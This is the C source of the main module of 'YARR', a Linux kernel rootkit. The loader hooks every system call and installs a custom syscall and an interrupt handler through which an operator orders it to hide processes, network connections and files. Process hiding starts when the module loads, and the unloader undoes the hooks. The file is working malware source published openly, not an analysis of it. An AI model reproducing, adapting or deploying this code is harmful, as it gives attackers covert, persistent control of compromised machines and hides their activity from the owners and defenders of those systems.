/*
 *  YARR - Yet Another Repetitive Rootkit
 *  Copyright (C) 2011 Ole 
 *
 *  This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation; either version 1, or (at your option)
 *  any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the 
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program; if not, write to the Free Software
 *  Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.
 */

#ifndef __YARR_IM_A_MIGHTY_PIRATE
#define __YARR_IM_A_MIGHTY_PIRATE

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/list.h>

#include "debug.h"
#include "interrupt.h"
#include "syscall.h"
#include "hide.h"
#include "types.h"
#include "hook.h"
#include "hideproc.h"

#ifndef __KERNEL__
#define __KERNEL__
#endif

#ifndef MODULE
#define MODULE
#endif

// TODO: Why is yarr exporting everything?.
#define EXPORT_NO_SYMBOLS

int intr_taken = -1;
int syscall_taken = -1;

/***
 * Initializes everything related with interrupts. Yarr tries to install a
 * handler on an interrupt to let you ask yarr to do something (hide process,
 * connections, files, etc).
 *
 * @return: Zero on success or -1 if there were errors.
 */
int init_interrupt(void) {
	// TODO: Don't hardcode our IRQ, get a free one.
	intr_taken = YARR_IRQ;
	if (intr_taken != -1) {
		if (installIntrDesc(intr_taken) == 0)
			debug("Installed IRQ handler on vector %d.\n", intr_taken);
		else {
			debug("Couldn't install the IRQ handler.\n");
			intr_taken = -1;
			return -1;
		}
	}
	else {
		debug("Couldn't find a free interrupt.\n");
		return -1;
	}

	return 0;
}

/***
 * Initializes everything related with syscalls. Yarr tries to install a
 * syscall to let you ask yarr to do something (hide process, connections,
 * files, etc).
 *
 * @return: Zero on sucess or -1 if there were errors.
 */
int init_syscall(void) {
	// TODO: Don't hardcode our syscall, get a free one.
	syscall_taken = YARR_SYSCALL;
	if (syscall_taken != -1) {
		if (installSyscall(syscall_taken) == 0)
			debug("Installed syscall on vector %d.\n", syscall_taken);
		else {
			debug("Couldn't install the syscall.\n");
			syscall_taken = -1;
			return -1;
		}
	}
	else {
		debug("Couldn't find a free syscall.\n");
		return -1;
	}

	return 0;
}

/***
 * Hooks all the syscalls of the system. Each method do it with a different
 * approach.
 */
int hook_syscalls(syscallHookingMethods method) {
	int res = -1;

	switch (method) {
		case HOOK_EACH_SYSCALL:
			res = hookEachSyscall();
			break;

		case PATCH_SYSTEM_CALL:
			res = patchSystemCall();
			break;

		case HOOK_SYSTEM_CALL:
			res = hookSystemCall();
			break;

		default:
			debug("YARR! WTF METHOD ARE YOU TALKING ABOUT?!\n");
	}

	return res;	
}

/***
 * Undo the changes mades by hook_syscalls().
 */
int unhook_syscalls(syscallHookingMethods method) {
	int res = -1;

	switch (method) {
		case HOOK_EACH_SYSCALL:
			res = unhookEachSyscall();
			break;

		case PATCH_SYSTEM_CALL:
			res = unpatchSystemCall();
			break;

		case HOOK_SYSTEM_CALL:
			res = unhookSystemCall();
			break;

		default:
			debug("YARR! WTF (un)METHOD ARE YOU TALKING ABOUT?!\n");
	}

	return res;	
}

/***
 * Module entry point.
 */
static int __init yarr_loader(void) {
	debug("Loading YARR into kernel...\n");

	// Hook the system calls.
	hook_syscalls(HOOK_EACH_SYSCALL);

	// Install yarrSyscall().
	init_syscall();

	// Init everything related with hidding processes.
	init_hideproc();

	debug("Now sys_call_table is at %p\n", getSyscallTable());
	return 0;
}

/***
 * Module exit entry point.
 */
static void __exit yarr_unloader(void) {
	debug("Unloading YARR from kernel...\n");

	// End hiding processes.
	exit_hideproc();

	// Restore the syscall.
	if (syscall_taken != -1) {
		uninstallSyscall(syscall_taken);
		debug("Syscall %d released.\n", syscall_taken);
	}

	// Undo syscall hooks.
	unhook_syscalls(HOOK_EACH_SYSCALL);
}

// Entry and exit points.
module_init(yarr_loader);
module_exit(yarr_unloader);

// Modinfo.
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Ole <olelen@gmail.com>");
MODULE_DESCRIPTION("Yet Another Repetitive Rootkit");

#endif /* __YARR_IM_A_MIGHTY_PIRATE */

